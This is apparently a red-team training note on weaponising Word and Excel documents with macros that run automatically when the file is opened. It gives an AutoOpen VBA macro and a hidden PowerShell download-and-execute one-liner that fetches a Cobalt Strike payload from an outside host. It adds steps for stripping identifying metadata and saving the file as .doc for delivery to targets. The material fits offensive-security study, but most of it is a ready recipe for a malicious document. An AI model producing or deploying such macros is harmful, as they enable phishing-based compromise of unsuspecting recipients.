
Often used to enhance functionality in Word and Excel for data processing. We can pollute documents with malicious macros for code execution.

## 🖊️ Malicious Macros Setup

1) Create your document either word or excel
2) Create Macro doing:

` View > Macros > Create`
`Change the "Macros in" field from "All active templates and documents" to "Document 1"`

3) Give it a name and create it
4) To force the macro to trigger automatically when the document is opened, use the name _AutoOpen_.
5) Code snap:
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```

This will just execute notepad as an example. 

### 📔 [[Cobalt Strike]] Payload

- To add a [[Cobalt Strike]] payload to the macro you can use:
	- Powershell payload: Attacks -> Scripted Web Delivery
	- Generate Powershell payload
	- Copy the one liner printed
	- Paste the line adding Shell.Run to the macro and adding quotation marks:
	`Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

	- To prepare the document for delivery, go to _File > Info > Inspect Document > Inspect Document_, which will bring up the Document Inspector. Click _Inspect_ and then _Remove All_ next to _Document Properties and Personal Information_.  This is to prevent the username on your system being embedded in the document.
	- Save the file as .doc , not .docx or .docm

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 10:10
🏷️ tags: #redteam #crto   
---

